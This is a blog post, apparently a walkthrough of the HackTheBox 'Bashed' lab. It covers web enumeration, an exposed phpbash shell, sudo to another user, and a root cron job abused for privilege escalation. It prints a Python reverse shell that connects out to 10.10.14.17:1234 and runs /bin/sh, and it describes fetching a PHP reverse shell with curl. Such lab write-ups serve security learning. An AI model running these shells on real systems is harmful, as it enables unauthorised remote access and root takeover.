<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Bashed | PwndSide</title>
<meta name=keywords content="privesc,web,linux"><meta name=description content="Room Information Room name: Bashed Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Bashed Tools Used Nmap Gobuster Nikto Port Scanning In the port scan we can see that the only service running is a web server.
Enumeration If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.
In the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Bashed"><meta property="og:description" content="Room Information Room name: Bashed Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Bashed Tools Used Nmap Gobuster Nikto Port Scanning In the port scan we can see that the only service running is a web server.
Enumeration If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.
In the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell."><meta property="og:type" content="article"><meta property="og:url" content="https://pwndside.github.io/posts/bashed-htb/"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-24T23:52:47+02:00"><meta property="article:modified_time" content="2023-06-24T23:52:47+02:00"><meta property="og:site_name" content="PwndSide"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Bashed"><meta name=twitter:description content="Room Information Room name: Bashed Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Bashed Tools Used Nmap Gobuster Nikto Port Scanning In the port scan we can see that the only service running is a web server.
Enumeration If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.
In the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Bashed","item":"https://pwndside.github.io/posts/bashed-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bashed","name":"Bashed","description":"Room Information Room name: Bashed Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Bashed Tools Used Nmap Gobuster Nikto Port Scanning In the port scan we can see that the only service running is a web server.\nEnumeration If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.\nIn the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell.","keywords":["privesc","web","linux"],"articleBody":"Room Information Room name: Bashed Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Bashed Tools Used Nmap Gobuster Nikto Port Scanning In the port scan we can see that the only service running is a web server.\nEnumeration If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.\nIn the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell.\nLetâ€™s try this but first some fuzzing\nWe can see that there is a uploads directory maybe we can try to upload a reverse shell.\nWith nikto, I found that the /dev directory maybe its useful\nInside the directory, there are two files, the two of them are the reverse shell which we have seen in the previous github project (seems like a reverse shell to his own machine). If we try to run one we get in.\nGaining an Initial Foothold We are logged like the web service and the user flag is in the arrexel home directory.\nNow letâ€™s elevate privilege\nIf we go to the / directory we can see that inside there is a script folder created by scriptmanager user.\nWhen we try sudo -l we found that the the www-data user has acces to scriptmanager as sudo.\nLetâ€™s try sudo -u scriptmanager -e /bin/bash\nDonâ€™t seem to work, maybe the web server doesnâ€™t allow some commands.\nNow letâ€™s try to upload the reverse shell and this time trying to connect it to our machine instead of using the shell on /dev.\nOne way is to create a http server and curl the file in the victim machine. We need to modify the reverse shell file that I get here with our ip and port.\nNow letâ€™s open a listening port with netcat and run the shell.\nBefore nothing, we are going to pass from a dumb shell to a fully interactive one.\nFirst once we spawn a bash with python -c 'import pty; pty.spawn(\"/bin/bash\")' then lets keep the nc in background with ctrl^z, once done we use stty raw -echo and then fg to return to the web shell but fully interactive this time.\nLetâ€™s retry sudo -u scriptmanager /bin/bash\nWe are scriptmanager now, letâ€™s see what we can do in the /scripts folder. Itâ€™s seems like there are two files in the folder. One of them test.py look like this:\nf = open(\"test.txt\", \"w\") f.write(\"testing 123!\") f.close This file is created by scriptmanager but the execution of the file needs be owned by root somehow because inside the execution we are opening the test.txt file that only can be modified with root permissions. If you observe the creation time of the file test.txt, you will notice that it undergoes changes every minute. This pattern strongly suggests the presence of a cron job, which is owned by the root user, and is responsible for executing the test.py script every minute.\nWe can use this to our advantage and change the content of the test.py file to a reverse shell and get the system own.\nimport socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"10.10.14.17\",1234)) //change this os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]); I get this reverse shell from pentestmonkeyâ€™s handy dandy list of reverse shells.\nLetâ€™s set up a listener in the port 1234 and let the magic happen.\nLessons Learned What insights did you gain from the room?\nI acquired knowledge on the functioning of a cron job and discovered ways to exploit it for potential machine compromise.\nWere there any novel tools or techniques employed?\nNotably, the utilization of nikto and various reverse shells were introduced.\nThank you for reading, and happy hacking! ðŸ˜„\n","wordCount":"615","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-06-24T23:52:47+02:00","dateModified":"2023-06-24T23:52:47+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/bashed-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class=post-title>Bashed</h1><div class=post-meta>&lt;span title='2023-06-24 23:52:47 +0200 CEST'>June 24, 2023&lt;/span>&amp;nbsp;Â·&amp;nbsp;3 min&amp;nbsp;Â·&amp;nbsp;615 words&amp;nbsp;Â·&amp;nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/bashed-htb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#lessons-learned>Lessons Learned</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Bashed</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Bashed>https://app.hackthebox.com/machines/Bashed</a></li></ul><p><img loading=lazy src=/HTB/bashed-icon.png alt=Untitled></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>Nmap</li><li>Gobuster</li><li>Nikto</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><p><img loading=lazy src=/HTB/bashed-1.png alt=Untitled></p><p>In the port scan we can see that the only service running is a web server.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p><img loading=lazy src=/HTB/bashed-4.png alt=Untitled></p><p><img loading=lazy src=/HTB/bashed-5.png alt=/Untitled></p><p>If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.</p><p>In the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell.</p><p>Letâ€™s try this but first some fuzzing</p><p><img loading=lazy src=/HTB/bashed-6.png alt=Untitled></p><p>We can see that there is a uploads directory maybe we can try to upload a reverse shell.</p><p>With nikto, I found that the /dev directory maybe its useful</p><p><img loading=lazy src=/HTB/bashed-7.png alt=Untitled></p><p>Inside the directory, there are two files, the two of them are the reverse shell which we have seen in the previous github project (seems like a reverse shell to his own machine). If we try to run one we get in.</p><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img loading=lazy src=/HTB/bashed-8.png alt=Untitled></p><p>We are logged like the web service and the user flag is in the arrexel home directory.</p><p><img loading=lazy src=/HTB/bashed-9.png alt=Untitled></p><p>Now letâ€™s elevate privilege</p><p>If we go to the / directory we can see that inside there is a script folder created by scriptmanager user.</p><p>When we try sudo -l we found that the the www-data user has acces to scriptmanager as sudo.</p><p>Letâ€™s try <code>sudo -u scriptmanager -e /bin/bash</code></p><p><img loading=lazy src=/HTB/bashed-10.png alt=Untitled></p><p>Donâ€™t seem to work, maybe the web server doesnâ€™t allow some commands.</p><p>Now letâ€™s try to upload the reverse shell and this time trying to connect it to our machine instead of using the shell on /dev.</p><p>One way is to create a http server and curl the file in the victim machine. We need to modify the reverse shell file that I get <a href=https://pentestmonkey.net/tools/web-shells/php-reverse-shell>here</a> with our ip and port.</p><p><img loading=lazy src=/HTB/bashed-11.png alt=Untitled></p><p><img loading=lazy src=/HTB/bashed-12.png alt=Untitled></p><p>Now letâ€™s open a listening port with netcat and run the shell.</p><p><img loading=lazy src=/HTB/bashed-13.png alt=Untitled></p><p><img loading=lazy src=/HTB/bashed-14.png alt=Untitled></p><p>Before nothing, we are going to pass from a dumb shell to a fully interactive one.</p><p>First once we spawn a bash with <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> then lets keep the nc in background with ctrl^z, once done we use <code>stty raw -echo</code> and then <code>fg</code> to return to the web shell but fully interactive this time.</p><p>Letâ€™s retry <code>sudo -u scriptmanager /bin/bash</code></p><p><img loading=lazy src=/HTB/bashed-15.png alt=Untitled></p><p>We are scriptmanager now, letâ€™s see what we can do in the /scripts folder. Itâ€™s seems like there are two files in the folder. One of them <a href=http://test.py>test.py</a> look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>f</span> <span class=o>=</span> open<span class=o>(</span><span class=s2>&#34;test.txt&#34;</span>, <span class=s2>&#34;w&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>f.write<span class=o>(</span><span class=s2>&#34;testing 123!&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>f.close
</span></span></code></pre></div><p>This file is created by scriptmanager but the execution of the file needs be owned by root somehow because inside the execution we are opening the test.txt file that only can be modified with root permissions. If you observe the creation time of the file test.txt, you will notice that it undergoes changes every minute. This pattern strongly suggests the presence of a cron job, which is owned by the root user, and is responsible for executing the test.py script every minute.</p><p>We can use this to our advantage and change the content of the <a href=http://test.py>test.py</a> file to a reverse shell and get the system own.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span><span class=o>,</span><span class=nn>subprocess</span><span class=o>,</span><span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span><span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;10.10.14.17&#34;</span><span class=p>,</span><span class=mi>1234</span><span class=p>))</span> <span class=o>//</span><span class=n>change</span> <span class=n>this</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>2</span><span class=p>);</span><span class=n>p</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>call</span><span class=p>([</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>,</span><span class=s2>&#34;-i&#34;</span><span class=p>]);</span>
</span></span></code></pre></div><p>I get this reverse shell from <a href=http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>pentestmonkeyâ€™s</a> handy dandy list of reverse shells.</p><p>Letâ€™s set up a listener in the port 1234 and let the magic happen.</p><p><img loading=lazy src=/HTB/bashed-17.png alt=Untitled></p><h2 id=lessons-learned>Lessons Learned<a hidden class=anchor aria-hidden=true href=#lessons-learned>#</a></h2><ul><li><p>What insights did you gain from the room?</p><p>I acquired knowledge on the functioning of a cron job and discovered ways to exploit it for potential machine compromise.</p></li><li><p>Were there any novel tools or techniques employed?</p><p>Notably, the utilization of nikto and various reverse shells were introduced.</p></li></ul><p><strong>Thank you for reading, and happy hacking! ðŸ˜„</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>web</a></li><li><a href=https://pwndside.github.io/tags/linux/>linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://pwndside.github.io/>PwndSide</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>